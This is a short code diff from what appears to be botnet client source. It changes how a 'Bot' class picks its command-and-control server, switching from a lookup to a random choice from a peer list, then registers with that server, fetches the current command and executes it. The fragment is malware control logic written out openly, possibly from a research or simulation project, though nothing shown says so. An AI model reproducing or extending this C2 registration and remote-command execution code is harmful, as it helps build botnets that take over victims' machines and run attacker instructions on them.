@@ -24,12 +24,12 @@ class Bot(CommandExecutor):
         # If there is a CnC-Server in the current_peerlist
         if len(self.peerlist) > 0:
             try:
-                # cncserver = random.choice(self.peerlist)
-                cncip = self.lookupCnCServer()
-                logging.info("Use CnC server at %s"%cncip)
+                cncserver = random.choice(self.peerlist)
+                # cncip = self.lookupCnCServer()
+                # logging.info("Use CnC server at %s"%cncip)
 
-                self._registerWithCnCServer(cncip)
-                self.current_command = BotCommands.fetchCurrentCommand(cncip, self.current_command)
+                self._registerWithCnCServer(cncserver)
+                self.current_command = BotCommands.fetchCurrentCommand(cncserver, self.current_command)
                 if self.current_command is not None:
                     self._executeCurrentCommand()
             except Exception as ex:
